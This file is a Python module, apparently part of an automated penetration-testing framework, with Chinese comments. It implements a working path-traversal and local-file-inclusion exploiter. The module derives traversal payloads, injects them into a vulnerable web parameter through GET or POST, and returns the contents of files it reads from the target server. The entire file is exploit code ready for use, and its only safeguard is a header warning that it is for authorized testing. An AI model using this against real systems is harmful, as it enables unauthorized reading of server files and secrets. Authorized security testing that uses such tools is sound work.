#!/usr/bin/env python3
"""
路径遍历利用器 - 自动文件读取

警告: 仅限授权渗透测试使用！
"""

import logging
import re
from pathlib import PurePosixPath, PureWindowsPath
from typing import Any, Dict, Iterable, List, Optional

from ..engine import (
    BaseExploiter,
    ExploitStatus,
    ExploitType,
    FileInfo,
    register_exploiter,
)

logger = logging.getLogger(__name__)


@register_exploiter(["path_traversal", "lfi"])
class PathTraversalExploiter(BaseExploiter):
    """路径遍历漏洞利用器"""

    name = "path_traversal_exploiter"
    supported_vuln_types = ["path_traversal", "lfi"]
    exploit_type = ExploitType.FILE_READ

    _compiled_patterns: Optional[Dict[str, Dict[str, List[re.Pattern]]]] = None

    def exploit(self, detection_result: Any, targets: Optional[Dict[str, Any]] = None, **kwargs):
        """执行路径遍历利用"""
        if not getattr(detection_result, "vulnerable", False):
            return self._create_result(
                status=ExploitStatus.NOT_APPLICABLE,
                vuln_type=getattr(detection_result, "vuln_type", "unknown"),
                url=getattr(detection_result, "url", ""),
                error="检测结果未发现漏洞",
            )

        url = getattr(detection_result, "url", "")
        param = getattr(detection_result, "param", None)
        if not url or not param:
            return self._create_result(
                status=ExploitStatus.NOT_APPLICABLE,
                vuln_type=getattr(detection_result, "vuln_type", "unknown"),
                url=url,
                error="缺少 URL 或参数，无法利用",
            )

        targets = targets or {}
        extra = getattr(detection_result, "extra", {}) or {}
        os_type = str(extra.get("os_type", "unix")).lower()
        target_file = str(extra.get("target_file", "")) if extra.get("target_file") else ""

        candidate_files = self._build_candidate_files(targets, os_type, target_file)
        if not candidate_files:
            return self._create_result(
                status=ExploitStatus.NOT_APPLICABLE,
                vuln_type=getattr(detection_result, "vuln_type", "unknown"),
                url=url,
                error="未提供可读取的文件目标",
            )

        base_payload = str(getattr(detection_result, "payload", "") or "")
        payload_entries = list(
            self._build_payloads(base_payload, target_file, candidate_files, os_type)
        )
        if not payload_entries:
            return self._create_result(
                status=ExploitStatus.FAILED,
                vuln_type=getattr(detection_result, "vuln_type", "unknown"),
                url=url,
                error="无法生成利用 payload",
            )

        timeout = targets.get("timeout")
        base_params = self._get_base_params(detection_result)
        method = self._get_method(detection_result)
        evidence = getattr(detection_result, "evidence", "") or ""

        files: List[FileInfo] = []
        attempted: List[str] = []
        used_payload = ""

        for payload, file_path in payload_entries:
            attempted.append(payload)
            params = dict(base_params)
            params[param] = payload

            try:
                response = self._send_request(method, url, params, timeout)
            except Exception as e:
                logger.debug(f"路径遍历请求失败: {e}")
                continue

            if not response or not getattr(response, "text", ""):
                continue

            if self._matches_file(response.text, file_path, os_type, evidence):
                files.append(
                    FileInfo(
                        path=file_path,
                        content=response.text[:2000],
                        size=len(response.text),
                        file_type=os_type,
                    )
                )
                used_payload = payload
                break

        if files:
            return self._create_result(
                status=ExploitStatus.SUCCESS,
                vuln_type=getattr(detection_result, "vuln_type", "unknown"),
                url=url,
                files=files,
                evidence=f"成功读取文件: {files[0].path}",
                payload_used=used_payload or (attempted[0] if attempted else ""),
                metadata={
                    "os_type": os_type,
                    "attempted_payloads": attempted[:10],
                },
            )

        return self._create_result(
            status=ExploitStatus.FAILED,
            vuln_type=getattr(detection_result, "vuln_type", "unknown"),
            url=url,
            error="未能读取目标文件",
            payload_used=attempted[0] if attempted else "",
            metadata={
                "os_type": os_type,
                "attempted_payloads": attempted[:10],
            },
        )

    def _build_candidate_files(
        self,
        targets: Dict[str, Any],
        os_type: str,
        target_file: str,
    ) -> List[str]:
        files_cfg = targets.get("files") or {}
        files: List[str] = []

        if isinstance(files_cfg, dict):
            files.extend(files_cfg.get(os_type, []) or [])
            if not files and os_type != "unix":
                files.extend(files_cfg.get("unix", []) or [])
        elif isinstance(files_cfg, list):
            files.extend([str(f) for f in files_cfg if f])

        if target_file:
            if target_file not in files:
                files.insert(0, target_file)

        max_files = targets.get("max_files", 5)
        try:
            max_files = int(max_files)
        except (TypeError, ValueError):
            max_files = 5

        return files[: max(1, max_files)]

    def _build_payloads(
        self,
        base_payload: str,
        target_file: str,
        files: List[str],
        os_type: str,
    ) -> Iterable[tuple[str, str]]:
        seen = set()

        if base_payload:
            seen.add(base_payload)
            yield base_payload, target_file or base_payload

        prefix = self._infer_prefix(base_payload, target_file)
        for file_path in files:
            payload = self._join_payload(prefix, file_path, os_type)
            if payload and payload not in seen:
                seen.add(payload)
                yield payload, file_path

    def _infer_prefix(self, payload: str, target_file: str) -> str:
        if not payload:
            return ""

        if target_file and target_file in payload:
            return payload.rsplit(target_file, 1)[0]

        # 尝试用文件名截断
        base_name = PurePosixPath(target_file).name if target_file else ""
        if base_name and base_name in payload:
            return payload.rsplit(base_name, 1)[0]

        # 退化为删除最后一段路径
        if "/" in payload:
            return payload.rsplit("/", 1)[0] + "/"
        if "\\" in payload:
            return payload.rsplit("\\", 1)[0] + "\\"

        return payload

    def _join_payload(self, prefix: str, file_path: str, os_type: str) -> str:
        if not prefix:
            return file_path

        if prefix.endswith(("/", "\\")):
            return prefix + file_path.lstrip("/\\")

        sep = "\\" if os_type == "windows" or "\\" in prefix else "/"
        stripped_path = file_path.lstrip("/\\")
        return f"{prefix}{sep}{stripped_path}"

    def _get_method(self, detection_result: Any) -> str:
        request = getattr(detection_result, "request", None)
        if request and getattr(request, "method", None):
            return str(request.method).upper()
        return "GET"

    def _get_base_params(self, detection_result: Any) -> Dict[str, Any]:
        request = getattr(detection_result, "request", None)
        params = getattr(request, "params", None) if request else None
        return dict(params) if isinstance(params, dict) else {}

    def _send_request(self, method: str, url: str, params: Dict[str, Any], timeout: Any):
        if method == "POST":
            return self.http_client.post(url, data=params, timeout=timeout)
        return self.http_client.get(url, params=params, timeout=timeout)

    def _matches_file(self, text: str, target_file: str, os_type: str, evidence: str) -> bool:
        if evidence and evidence in text:
            return True

        patterns = self._get_file_patterns()
        candidates = []
        if target_file:
            candidates.append(target_file)
            candidates.append(PurePosixPath(target_file).name)
            candidates.append(PureWindowsPath(target_file).name)

        for candidate in candidates:
            if not candidate:
                continue
            for key in (candidate, candidate.lower()):
                if key in patterns.get(os_type, {}):
                    if any(p.search(text) for p in patterns[os_type][key]):
                        return True

        return False

    def _get_file_patterns(self) -> Dict[str, Dict[str, List[re.Pattern]]]:
        if self._compiled_patterns is None:
            try:
                from core.detectors.access.path_traversal import PathTraversalDetector

                compiled: Dict[str, Dict[str, List[re.Pattern]]] = {}
                for os_name, files in PathTraversalDetector.FILE_SIGNATURES.items():
                    compiled[os_name] = {}
                    for file_name, patterns in files.items():
                        compiled[os_name][file_name] = [
                            re.compile(p, re.IGNORECASE) for p in patterns
                        ]
                self._compiled_patterns = compiled
            except Exception as e:
                logger.debug(f"加载路径遍历签名失败: {e}")
                self._compiled_patterns = {"unix": {}, "windows": {}}

        return self._compiled_patterns


__all__ = ["PathTraversalExploiter"]
